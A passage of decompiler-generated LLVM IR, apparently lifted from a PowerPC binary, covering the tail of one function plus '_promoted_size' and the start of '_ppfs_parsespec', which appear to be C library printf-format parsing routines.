  br i1 %tmp24, label %dec_label_pc_1001ae8c, label %dec_label_pc_1001add0

dec_label_pc_1001add0:                            ; preds = %dec_label_pc_1001adc4
  %v2_1001add0 = icmp sgt i32 %v3_1001ad9c, 2048
  %v3_1001add0 = icmp eq i32 %v3_1001ad9c, 2048
  store i1 %v2_1001add0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001add0, label %dec_label_pc_1001ade4, label %dec_label_pc_1001add8

dec_label_pc_1001add8:                            ; preds = %dec_label_pc_1001add0
  %v2_1001add8 = icmp sgt i32 %v3_1001ad9c, 2055
  %v3_1001add8 = icmp eq i32 %v3_1001ad9c, 2055
  store i1 %v2_1001add8, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001add8, label %dec_label_pc_1001ae40, label %dec_label_pc_1001ae8c

dec_label_pc_1001addc:                            ; preds = %dec_label_pc_1001adb0
  %v3_1001adbc = icmp eq i32 %v3_1001ad9c, 7
  store i1 false, i1* %cr7_gt.global-to-local, align 1
  br i1 %v3_1001adbc, label %dec_label_pc_1001ae40, label %dec_label_pc_1001ae8c

dec_label_pc_1001ade4:                            ; preds = %dec_label_pc_1001add0
  %v2_1001ade4 = inttoptr i32 %v1_1001ada8 to i8*
  %v3_1001ade4 = load i8, i8* %v2_1001ade4, align 1
  %v4_1001ade4 = zext i8 %v3_1001ade4 to i32
  %v2_1001ade8 = icmp ugt i8 %v3_1001ade4, 6
  store i1 %v2_1001ade8, i1* %cr7_gt.global-to-local, align 1
  %tmp28 = urem i8 %v3_1001ade4, 2
  %v1_1001adec = zext i8 %tmp28 to i32
  store i32 %v1_1001adec, i32* %r9.global-to-local, align 4
  %v2_1001adf0 = add nuw nsw i32 %v1_1001adec, %v4_1001ade4
  store i32 %v2_1001adf0, i32* %r0.global-to-local, align 4
  %v1_1001adf4 = trunc i32 %v2_1001adf0 to i8
  store i8 %v1_1001adf4, i8* %v2_1001ade4, align 1
  %v0_1001adf8 = load i1, i1* %cr7_gt.global-to-local, align 1
  br i1 %v0_1001adf8, label %dec_label_pc_1001ae18, label %dec_label_pc_1001adfc

dec_label_pc_1001adfc:                            ; preds = %dec_label_pc_1001ade4
  %v0_1001adfc = load i32, i32* %r0.global-to-local, align 4
  %v1_1001adfc = urem i32 %v0_1001adfc, 256
  store i32 %v1_1001adfc, i32* %r9.global-to-local, align 4
  %v0_1001ae00 = load i32, i32* @r10, align 4
  %v1_1001ae00 = add i32 %v0_1001ae00, 8
  %v2_1001ae00 = inttoptr i32 %v1_1001ae00 to i32*
  %v3_1001ae00 = load i32, i32* %v2_1001ae00, align 4
  %v1_1001ae04 = mul nuw nsw i32 %v1_1001adfc, 4
  store i32 %v1_1001ae04, i32* %r0.global-to-local, align 4
  %v1_1001ae08 = add nuw nsw i32 %v1_1001adfc, 2
  store i32 %v1_1001ae08, i32* %r9.global-to-local, align 4
  %v2_1001ae0c = add i32 %v3_1001ae00, %v1_1001ae04
  store i32 %v2_1001ae0c, i32* %r11.global-to-local, align 4
  %v1_1001ae10 = trunc i32 %v1_1001ae08 to i8
  %v2_1001ae10 = load i32, i32* @r3, align 4
  %v3_1001ae10 = add i32 %v2_1001ae10, 76
  %v4_1001ae10 = inttoptr i32 %v3_1001ae10 to i8*
  store i8 %v1_1001ae10, i8* %v4_1001ae10, align 1
  br label %dec_label_pc_1001ae2c

dec_label_pc_1001ae18:                            ; preds = %dec_label_pc_1001ade4
  %v0_1001ae18 = load i32, i32* @r10, align 4
  %v1_1001ae18 = add i32 %v0_1001ae18, 4
  %v2_1001ae18 = inttoptr i32 %v1_1001ae18 to i32*
  %v3_1001ae18 = load i32, i32* %v2_1001ae18, align 4
  %v1_1001ae1c = add i32 %v3_1001ae18, 7
  store i32 %v1_1001ae1c, i32* %r9.global-to-local, align 4
  %v1_1001ae20 = call i32 @__asm_rlwinm(i32 %v1_1001ae1c, i32 0, i32 0, i32 28)
  store i32 %v1_1001ae20, i32* %r11.global-to-local, align 4
  %v1_1001ae24 = add i32 %v1_1001ae20, 8
  store i32 %v1_1001ae24, i32* %r0.global-to-local, align 4
  %v1_1001ae28 = load i32, i32* @r10, align 4
  %v2_1001ae28 = add i32 %v1_1001ae28, 4
  %v3_1001ae28 = inttoptr i32 %v2_1001ae28 to i32*
  store i32 %v1_1001ae24, i32* %v3_1001ae28, align 4
  br label %dec_label_pc_1001ae2c

dec_label_pc_1001ae2c:                            ; preds = %dec_label_pc_1001adfc, %dec_label_pc_1001ae18
  %v0_1001ae2c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ae2c = inttoptr i32 %v0_1001ae2c to i32*
  %v2_1001ae2c = load i32, i32* %v1_1001ae2c, align 4
  store i32 %v2_1001ae2c, i32* %r9.global-to-local, align 4
  %v1_1001ae30 = add i32 %v0_1001ae2c, 4
  %v2_1001ae30 = inttoptr i32 %v1_1001ae30 to i32*
  %v3_1001ae30 = load i32, i32* %v2_1001ae30, align 4
  store i32 %v3_1001ae30, i32* @r10, align 4
  %v1_1001ae34 = load i32, i32* @r8, align 4
  %v2_1001ae34 = inttoptr i32 %v1_1001ae34 to i32*
  store i32 %v2_1001ae2c, i32* %v2_1001ae34, align 4
  %v0_1001ae38 = load i32, i32* @r10, align 4
  %v1_1001ae38 = load i32, i32* @r8, align 4
  %v2_1001ae38 = add i32 %v1_1001ae38, 4
  %v3_1001ae38 = inttoptr i32 %v2_1001ae38 to i32*
  store i32 %v0_1001ae38, i32* %v3_1001ae38, align 4
  br label %dec_label_pc_1001aec4

dec_label_pc_1001ae40:                            ; preds = %dec_label_pc_1001add8, %dec_label_pc_1001addc
  store i32 %v1_1001ada8, i32* @r10, align 4
  %v1_1001ae44 = add i32 %v2_1001aea8, 77
  %v2_1001ae44 = inttoptr i32 %v1_1001ae44 to i8*
  %v3_1001ae44 = load i8, i8* %v2_1001ae44, align 1
  %v4_1001ae44 = zext i8 %v3_1001ae44 to i32
  store i32 %v4_1001ae44, i32* %r11.global-to-local, align 4
  %v2_1001ae48 = icmp ugt i8 %v3_1001ae44, 8
  store i1 %v2_1001ae48, i1* %cr7_gt.global-to-local, align 1
  %tmp25 = icmp ugt i8 %v3_1001ae44, 7
  br i1 %tmp25, label %dec_label_pc_1001ae6c, label %dec_label_pc_1001ae50

dec_label_pc_1001ae50:                            ; preds = %dec_label_pc_1001ae40
  %v1_1001ae50 = add i32 %v2_1001aea8, 84
  %v2_1001ae50 = inttoptr i32 %v1_1001ae50 to i32*
  %v3_1001ae50 = load i32, i32* %v2_1001ae50, align 4
  %v1_1001ae54 = mul nuw nsw i32 %v4_1001ae44, 8
  %v1_1001ae58 = add nuw nsw i32 %v1_1001ae54, 32
  %v2_1001ae5c = add i32 %v1_1001ae58, %v3_1001ae50
  store i32 %v2_1001ae5c, i32* %r9.global-to-local, align 4
  %v1_1001ae60 = add nuw nsw i32 %v4_1001ae44, 1
  store i32 %v1_1001ae60, i32* %r0.global-to-local, align 4
  %v1_1001ae64 = trunc i32 %v1_1001ae60 to i8
  store i8 %v1_1001ae64, i8* %v2_1001ae44, align 1
  br label %dec_label_pc_1001aec4

dec_label_pc_1001ae6c:                            ; preds = %dec_label_pc_1001ae40
  %v1_1001ae6c = add i32 %v2_1001aea8, 80
  %v2_1001ae6c = inttoptr i32 %v1_1001ae6c to i32*
  %v3_1001ae6c = load i32, i32* %v2_1001ae6c, align 4
  %v1_1001ae70 = add i32 %v3_1001ae6c, 7
  store i32 %v1_1001ae70, i32* %r9.global-to-local, align 4
  %v1_1001ae74 = call i32 @__asm_rlwinm(i32 %v1_1001ae70, i32 0, i32 0, i32 28)
  store i32 %v1_1001ae74, i32* %r9.global-to-local, align 4
  %v1_1001ae78 = add i32 %v1_1001ae74, 8
  store i32 %v1_1001ae78, i32* %r0.global-to-local, align 4
  %v1_1001ae7c = load i32, i32* @r10, align 4
  %v2_1001ae7c = add i32 %v1_1001ae7c, 4
  %v3_1001ae7c = inttoptr i32 %v2_1001ae7c to i32*
  store i32 %v1_1001ae78, i32* %v3_1001ae7c, align 4
  br label %dec_label_pc_1001aec4

dec_label_pc_1001ae8c:                            ; preds = %dec_label_pc_1001add8, %dec_label_pc_1001addc, %dec_label_pc_1001adc4, %dec_label_pc_1001adb0
  %v2_1001ae8c = inttoptr i32 %v1_1001ada8 to i8*
  %v3_1001ae8c = load i8, i8* %v2_1001ae8c, align 1
  %v4_1001ae8c = zext i8 %v3_1001ae8c to i32
  store i32 %v4_1001ae8c, i32* %r11.global-to-local, align 4
  %v2_1001ae90 = icmp ugt i8 %v3_1001ae8c, 8
  store i1 %v2_1001ae90, i1* %cr7_gt.global-to-local, align 1
  %tmp26 = icmp ugt i8 %v3_1001ae8c, 7
  br i1 %tmp26, label %dec_label_pc_1001aeb0, label %dec_label_pc_1001ae98

dec_label_pc_1001ae98:                            ; preds = %dec_label_pc_1001ae8c
  %v1_1001ae98 = add i32 %v2_1001aea8, 84
  %v2_1001ae98 = inttoptr i32 %v1_1001ae98 to i32*
  %v3_1001ae98 = load i32, i32* %v2_1001ae98, align 4
  %v1_1001ae9c = mul nuw nsw i32 %v4_1001ae8c, 4
  %v2_1001aea0 = add i32 %v3_1001ae98, %v1_1001ae9c
  store i32 %v2_1001aea0, i32* %r9.global-to-local, align 4
  %v1_1001aea4 = add nuw nsw i32 %v4_1001ae8c, 1
  store i32 %v1_1001aea4, i32* %r0.global-to-local, align 4
  %v1_1001aea8 = trunc i32 %v1_1001aea4 to i8
  store i8 %v1_1001aea8, i8* %v2_1001ae8c, align 1
  br label %dec_label_pc_1001aebc

dec_label_pc_1001aeb0:                            ; preds = %dec_label_pc_1001ae8c
  %v1_1001aeb0 = add i32 %v2_1001aea8, 80
  %v2_1001aeb0 = inttoptr i32 %v1_1001aeb0 to i32*
  %v3_1001aeb0 = load i32, i32* %v2_1001aeb0, align 4
  store i32 %v3_1001aeb0, i32* %r9.global-to-local, align 4
  %v1_1001aeb4 = add i32 %v3_1001aeb0, 4
  store i32 %v1_1001aeb4, i32* %r0.global-to-local, align 4
  store i32 %v1_1001aeb4, i32* %v2_1001aeb0, align 4
  br label %dec_label_pc_1001aebc

dec_label_pc_1001aebc:                            ; preds = %dec_label_pc_1001ae98, %dec_label_pc_1001aeb0
  %v0_1001aebc = load i32, i32* %r9.global-to-local, align 4
  %v1_1001aebc = inttoptr i32 %v0_1001aebc to i32*
  %v2_1001aebc = load i32, i32* %v1_1001aebc, align 4
  store i32 %v2_1001aebc, i32* %r0.global-to-local, align 4
  %v1_1001aec0 = load i32, i32* @r8, align 4
  %v2_1001aec0 = inttoptr i32 %v1_1001aec0 to i32*
  store i32 %v2_1001aebc, i32* %v2_1001aec0, align 4
  br label %dec_label_pc_1001aec4

dec_label_pc_1001aec4:                            ; preds = %dec_label_pc_1001ae6c, %dec_label_pc_1001ae50, %dec_label_pc_1001ae2c, %dec_label_pc_1001aebc
  %v0_1001aec4 = load i32, i32* @r8, align 4
  %v1_1001aec4 = add i32 %v0_1001aec4, 8
  store i32 %v1_1001aec4, i32* @r8, align 4
  %v0_1001aec8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1001aecc.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001aec8

dec_label_pc_1001aec8:                            ; preds = %dec_label_pc_1001ad94, %dec_label_pc_1001aec4
  %v0_1001aecc = phi i32 [ %v2_1001aea8, %dec_label_pc_1001ad94 ], [ %v0_1001aecc.pre, %dec_label_pc_1001aec4 ]
  %v0_1001aec8 = phi i32 [ %v0_1001ad94, %dec_label_pc_1001ad94 ], [ %v0_1001aec8.pre, %dec_label_pc_1001aec4 ]
  %v1_1001aec8 = add i32 %v0_1001aec8, 1
  store i32 %v1_1001aec8, i32* %r7.global-to-local, align 4
  %v1_1001aecc = add i32 %v0_1001aecc, 28
  %v2_1001aecc = inttoptr i32 %v1_1001aecc to i32*
  %v3_1001aecc = load i32, i32* %v2_1001aecc, align 4
  store i32 %v3_1001aecc, i32* %r0.global-to-local, align 4
  %v2_1001aed0 = icmp slt i32 %v1_1001aec8, %v3_1001aecc
  %v3_1001aed0 = icmp sgt i32 %v1_1001aec8, %v3_1001aecc
  store i1 %v3_1001aed0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v2_1001aed0, label %dec_label_pc_1001ad94, label %dec_label_pc_1001af1c

dec_label_pc_1001aedc:                            ; preds = %entry
  store i32 -2147483648, i32* %r11.global-to-local, align 4
  %v3_1001aee0 = icmp ne i32 %v3_1001ace4, -2147483648
  %v4_1001aee0 = icmp eq i32 %v3_1001ace4, -2147483648
  store i1 %v3_1001aee0, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001aee0, label %dec_label_pc_1001aee8, label %dec_label_pc_1001aefc

dec_label_pc_1001aee8:                            ; preds = %dec_label_pc_1001aedc
  %v1_1001aee8 = add i32 %v0_1001acdc, 36
  %v2_1001aee8 = inttoptr i32 %v1_1001aee8 to i8*
  %v3_1001aee8 = load i8, i8* %v2_1001aee8, align 1
  %v4_1001aee8 = zext i8 %v3_1001aee8 to i32
  %v1_1001aeec = mul nuw nsw i32 %v4_1001aee8, 8
  %v2_1001aef0 = add i32 %v1_1001aeec, %v1_1001ace0
  store i32 %v2_1001aef0, i32* %r9.global-to-local, align 4
  %v1_1001aef4 = add i32 %v2_1001aef0, -8
  %v2_1001aef4 = inttoptr i32 %v1_1001aef4 to i32*
  %v3_1001aef4 = load i32, i32* %v2_1001aef4, align 4
  store i32 %v3_1001aef4, i32* %r0.global-to-local, align 4
  store i32 %v3_1001aef4, i32* %v2_1001ace4, align 4
  %v0_1001aefc.pre = load i32, i32* @r3, align 4
  %v1_1001af00.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001aefc

dec_label_pc_1001aefc:                            ; preds = %dec_label_pc_1001aedc, %dec_label_pc_1001aee8
  %v1_1001af00 = phi i32 [ -2147483648, %dec_label_pc_1001aedc ], [ %v1_1001af00.pre, %dec_label_pc_1001aee8 ]
  %v1_1001af18 = phi i32 [ %v0_1001acdc, %dec_label_pc_1001aedc ], [ %v0_1001aefc.pre, %dec_label_pc_1001aee8 ]
  %v1_1001aefc = add i32 %v1_1001af18, 4
  %v2_1001aefc = inttoptr i32 %v1_1001aefc to i32*
  %v3_1001aefc = load i32, i32* %v2_1001aefc, align 4
  store i32 %v3_1001aefc, i32* %r0.global-to-local, align 4
  %v3_1001af00 = icmp sgt i32 %v3_1001aefc, %v1_1001af00
  %v4_1001af00 = icmp eq i32 %v3_1001aefc, %v1_1001af00
  store i1 %v3_1001af00, i1* %cr7_gt.global-to-local, align 1
  br i1 %v4_1001af00, label %dec_label_pc_1001af08, label %dec_label_pc_1001af1c

dec_label_pc_1001af08:                            ; preds = %dec_label_pc_1001aefc
  %v1_1001af08 = add i32 %v1_1001af18, 37
  %v2_1001af08 = inttoptr i32 %v1_1001af08 to i8*
  %v3_1001af08 = load i8, i8* %v2_1001af08, align 1
  %v4_1001af08 = zext i8 %v3_1001af08 to i32
  %v1_1001af0c = mul nuw nsw i32 %v4_1001af08, 8
  %v1_1001af10 = load i32, i32* @r8, align 4
  %v2_1001af10 = add i32 %v1_1001af0c, %v1_1001af10
  store i32 %v2_1001af10, i32* %r9.global-to-local, align 4
  %v1_1001af14 = add i32 %v2_1001af10, -8
  %v2_1001af14 = inttoptr i32 %v1_1001af14 to i32*
  %v3_1001af14 = load i32, i32* %v2_1001af14, align 4
  store i32 %v3_1001af14, i32* %r0.global-to-local, align 4
  store i32 %v3_1001af14, i32* %v2_1001aefc, align 4
  %v0_1001af1c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1001af1c

dec_label_pc_1001af1c:                            ; preds = %dec_label_pc_1001aec8, %dec_label_pc_1001aecc.preheader, %dec_label_pc_1001aefc, %dec_label_pc_1001af08
  %v0_1001af1c = phi i32 [ %v1_1001af18, %dec_label_pc_1001aefc ], [ %v0_1001af1c.pre, %dec_label_pc_1001af08 ], [ %v0_1001aecc5, %dec_label_pc_1001aecc.preheader ], [ %v0_1001aecc, %dec_label_pc_1001aec8 ]
  %v1_1001af1c = add i32 %v0_1001af1c, 8
  %v2_1001af1c = inttoptr i32 %v1_1001af1c to i32*
  %v3_1001af1c = load i32, i32* %v2_1001af1c, align 4
  store i32 %v3_1001af1c, i32* %r11.global-to-local, align 4
  %v2_1001af20 = icmp sgt i32 %v3_1001af1c, 0
  store i1 %v2_1001af20, i1* %cr7_gt.global-to-local, align 1
  %v0_1001af24 = load i32, i32* @lr, align 4
  %tmp27 = icmp sgt i32 %v3_1001af1c, -1
  call void @__pseudo_cond_branch(i1 %tmp27, i32 %v0_1001af24)
  %v0_1001af28 = load i32, i32* @r3, align 4
  %v1_1001af28 = add i32 %v0_1001af28, 16
  %v2_1001af28 = inttoptr i32 %v1_1001af28 to i32*
  %v3_1001af28 = load i32, i32* %v2_1001af28, align 4
  store i32 %v3_1001af28, i32* %r0.global-to-local, align 4
  %v0_1001af2c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001af2c = sub i32 0, %v0_1001af2c
  store i32 %v1_1001af2c, i32* @r11, align 4
  store i32 32, i32* %r9.global-to-local, align 4
  %v2_1001af34 = add i32 %v0_1001af28, 8
  %v3_1001af34 = inttoptr i32 %v2_1001af34 to i32*
  store i32 %v1_1001af2c, i32* %v3_1001af34, align 4
  %v0_1001af38 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001af38 = or i32 %v0_1001af38, 8
  store i32 %v1_1001af38, i32* %r0.global-to-local, align 4
  %v0_1001af3c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001af3c = load i32, i32* @r3, align 4
  %v2_1001af3c = add i32 %v1_1001af3c, 20
  %v3_1001af3c = inttoptr i32 %v2_1001af3c to i32*
  store i32 %v0_1001af3c, i32* %v3_1001af3c, align 4
  %v1_1001af40 = call i32 @__asm_rlwinm(i32 %v1_1001af38, i32 0, i32 0, i32 30)
  store i32 %v1_1001af40, i32* %r0.global-to-local, align 4
  %v1_1001af44 = load i32, i32* @r3, align 4
  %v2_1001af44 = add i32 %v1_1001af44, 16
  %v3_1001af44 = inttoptr i32 %v2_1001af44 to i32*
  store i32 %v1_1001af40, i32* %v3_1001af44, align 4
  %v0_1001af48 = load i32, i32* @r3, align 4
  ret i32 %v0_1001af48

; uselistorder directives
  uselistorder i32 %v3_1001aefc, { 1, 0, 2 }
  uselistorder i32 %v1_1001af00, { 1, 0 }
  uselistorder i32 %v3_1001aecc, { 1, 0, 2 }
  uselistorder i32 %v1_1001aec8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_1001aecc, { 0, 2, 1 }
  uselistorder i32 %v4_1001ae44, { 1, 0, 2 }
  uselistorder i32 %v1_1001ae04, { 1, 0 }
  uselistorder i32 %v1_1001adfc, { 2, 0, 1 }
  uselistorder i32 %v1_1001ada8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_1001ad9c, { 4, 1, 0, 3, 2, 8, 5, 7, 6, 10, 9, 11 }
  uselistorder i32 %v0_1001ad94, { 1, 0 }
  uselistorder i32 %v2_1001aea8, { 5, 3, 4, 1, 2, 6, 7, 0 }
  uselistorder i32 %v0_1001aecc5, { 1, 0, 2 }
  uselistorder i32 %v3_1001ad3c, { 1, 0, 2 }
  uselistorder i32 %v2_1001ad6c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v3_1001ace4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v3_1001acdc, { 1, 0, 2 }
  uselistorder i32 %v0_1001acdc, { 4, 5, 2, 0, 1, 3, 6, 7, 8 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 21, 20, 22, 23 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28 }
  uselistorder i1* %cr7_gt.global-to-local, { 3, 4, 5, 14, 6, 7, 8, 9, 2, 1, 10, 11, 12, 13, 0, 15, 16, 17, 18, 19 }
  uselistorder i32 76, { 3, 4, 5, 6, 1, 0, 2, 7 }
  uselistorder label %dec_label_pc_1001af1c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001aefc, { 1, 0 }
  uselistorder label %dec_label_pc_1001aec8, { 1, 0 }
  uselistorder label %dec_label_pc_1001aec4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001aebc, { 1, 0 }
  uselistorder label %dec_label_pc_1001ae8c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001ae40, { 1, 0 }
  uselistorder label %dec_label_pc_1001ae2c, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad94, { 1, 0 }
  uselistorder label %dec_label_pc_1001aecc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad80, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_1001ad30, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  br label %dec_label_pc_1001af58

dec_label_pc_1001af58:                            ; preds = %dec_label_pc_1001af58, %entry
  %v0_1001af58 = phi i32 [ ptrtoint (i32* @global_var_1002e4a4.1168 to i32), %entry ], [ %v1_1001af58, %dec_label_pc_1001af58 ]
  %v1_1001af58 = add i32 %v0_1001af58, -2
  %v2_1001af58 = inttoptr i32 %v1_1001af58 to i16*
  %v3_1001af58 = load i16, i16* %v2_1001af58, align 2
  %v4_1001af58 = sext i16 %v3_1001af58 to i32
  %v4_1001af5c = icmp eq i32 %v4_1001af58, %arg1
  %v3_1001af60.not = icmp ule i32 %v1_1001af58, ptrtoint (i32* @global_var_1002e48c.1169 to i32)
  %brmerge = or i1 %v4_1001af5c, %v3_1001af60.not
  br i1 %brmerge, label %dec_label_pc_1001af6c, label %dec_label_pc_1001af58

dec_label_pc_1001af6c:                            ; preds = %dec_label_pc_1001af58
  %v2_1001af74 = sub i32 %v1_1001af58, ptrtoint (i32* @global_var_1002e48c.1169 to i32)
  %v1_1001af7c = udiv i32 %v2_1001af74, 2
  %v2_1001af7c = and i32 %v2_1001af74, -2147483648
  %v3_1001af7c = or i32 %v1_1001af7c, %v2_1001af7c
  store i32 ptrtoint (i32* @global_var_1002e4a4.1168 to i32), i32* @r11, align 4
  %v2_1001af84 = add i32 %v3_1001af7c, ptrtoint (i32* @global_var_1002e4a4.1168 to i32)
  %v3_1001af84 = inttoptr i32 %v2_1001af84 to i8*
  %v4_1001af84 = load i8, i8* %v3_1001af84, align 1
  %v5_1001af84 = zext i8 %v4_1001af84 to i32
  ret i32 %v5_1001af84

; uselistorder directives
  uselistorder i32 %v2_1001af74, { 1, 0 }
  uselistorder i32 %v1_1001af58, { 1, 0, 3, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e48c.1169 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e4a4.1168 to i32), { 1, 2, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-79 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_1001af8c = load i32, i32* @lr, align 4
  store i32 %v0_1001af8c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v1_1001afa4 = add i32 %tmp, 16
  %v2_1001afa4 = inttoptr i32 %v1_1001afa4 to i32*
  %v3_1001afa4 = load i32, i32* %v2_1001afa4, align 4
  %v1_1001afac = and i32 %v3_1001afa4, 128
  store i32 %v1_1001afac, i32* %r6.global-to-local, align 4
  %v3_1001afac = icmp eq i32 %v1_1001afac, 0
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 8, i32* %stack_var_-104, align 4
  %v1_1001afc0 = add i32 %tmp, 24
  %v2_1001afc0 = inttoptr i32 %v1_1001afc0 to i32*
  %v3_1001afc0 = load i32, i32* %v2_1001afc0, align 4
  store i32 %v3_1001afc0, i32* @r26, align 4
  br i1 %v3_1001afac, label %dec_label_pc_1001afc8, label %dec_label_pc_1001afe0

dec_label_pc_1001afc8:                            ; preds = %entry
  %v2_1001afc8 = load i32, i32* %arg1, align 4
  %.pre = ptrtoint i32* %stack_var_-104 to i32
  br label %dec_label_pc_1001b034

dec_label_pc_1001afd8:                            ; preds = %dec_label_pc_1001b208
  %v1_1001afd8 = add i32 %v0_1001b1d8, 1
  store i32 %v1_1001afd8, i32* @r30, align 4
  br label %dec_label_pc_1001b220

dec_label_pc_1001afe0:                            ; preds = %entry
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_1001afe4 = load i32, i32* %arg1, align 4
  store i32 %v2_1001afe4, i32* @r8, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001aff0 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1001aff0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001aff4

dec_label_pc_1001aff4:                            ; preds = %dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge, %dec_label_pc_1001afe0
  %v0_1001affc = phi i32 [ %v0_1001affc.pre, %dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge ], [ %v2_1001afe4, %dec_label_pc_1001afe0 ]
  %v0_1001aff8 = phi i32 [ %v0_1001aff8.pre, %dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge ], [ %v2_1001aff0, %dec_label_pc_1001afe0 ]
  %v0_1001b000 = phi i32 [ %v0_1001aff4.pre, %dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge ], [ 0, %dec_label_pc_1001afe0 ]
  %v1_1001aff4 = mul i32 %v0_1001b000, 4
  %v2_1001aff8 = add i32 %v0_1001b000, %v0_1001aff8
  store i32 %v2_1001aff8, i32* %r9.global-to-local, align 4
  %v2_1001affc = add i32 %v1_1001aff4, %v0_1001affc
  store i32 %v2_1001affc, i32* @r11, align 4
  %v1_1001b000 = add i32 %v0_1001b000, 1
  store i32 %v1_1001b000, i32* @r10, align 4
  %v1_1001b004 = add i32 %v2_1001affc, -4
  %v2_1001b004 = inttoptr i32 %v1_1001b004 to i32*
  %v3_1001b004 = load i32, i32* %v2_1001b004, align 4
  store i32 %v3_1001b004, i32* %r0.global-to-local, align 4
  %v1_1001b008 = trunc i32 %v3_1001b004 to i8
  %v3_1001b008 = add i32 %v2_1001aff8, 24
  %v4_1001b008 = inttoptr i32 %v3_1001b008 to i8*
  store i8 %v1_1001b008, i8* %v4_1001b008, align 1
  %v0_1001b00c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001b00c = urem i32 %v0_1001b00c, 256
  store i32 %v1_1001b00c, i32* %r0.global-to-local, align 4
  %v0_1001b014 = load i32, i32* @r11, align 4
  %v1_1001b014 = add i32 %v0_1001b014, -4
  %v2_1001b014 = inttoptr i32 %v1_1001b014 to i32*
  %v3_1001b014 = load i32, i32* %v2_1001b014, align 4
  store i32 %v3_1001b014, i32* %r9.global-to-local, align 4
  %v4_1001b018 = icmp eq i32 %v1_1001b00c, %v3_1001b014
  br i1 %v4_1001b018, label %dec_label_pc_1001b020, label %dec_label_pc_1001b490

dec_label_pc_1001b020:                            ; preds = %dec_label_pc_1001aff4
  %v3_1001b010 = icmp eq i32 %v1_1001b00c, 0
  br i1 %v3_1001b010, label %dec_label_pc_1001b028, label %dec_label_pc_1001b024

dec_label_pc_1001b024:                            ; preds = %dec_label_pc_1001b020
  %v0_1001b024 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001b024 = add i32 %v0_1001b024, -1
  store i32 %v1_1001b024, i32* %ctr.global-to-local, align 4
  %v2_1001b024 = icmp eq i32 %v1_1001b024, 0
  br i1 %v2_1001b024, label %dec_label_pc_1001b028, label %dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge

dec_label_pc_1001b024.dec_label_pc_1001aff4_crit_edge: ; preds = %dec_label_pc_1001b024
  %v0_1001aff4.pre = load i32, i32* @r10, align 4
  %v0_1001aff8.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1001affc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001aff4

dec_label_pc_1001b028:                            ; preds = %dec_label_pc_1001b024, %dec_label_pc_1001b020
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1001b02c = ptrtoint i32* %stack_var_-79 to i32
  br label %dec_label_pc_1001b034

dec_label_pc_1001b034:                            ; preds = %dec_label_pc_1001afc8, %dec_label_pc_1001b028
  %v2_1001b044.pre-phi = phi i32 [ %.pre, %dec_label_pc_1001afc8 ], [ %v2_1001aff0, %dec_label_pc_1001b028 ]
  %storemerge3 = phi i32 [ %v2_1001afc8, %dec_label_pc_1001afc8 ], [ %v2_1001b02c, %dec_label_pc_1001b028 ]
  store i32 %storemerge3, i32* @r10, align 4
  store i32 0, i32* @r31, align 4
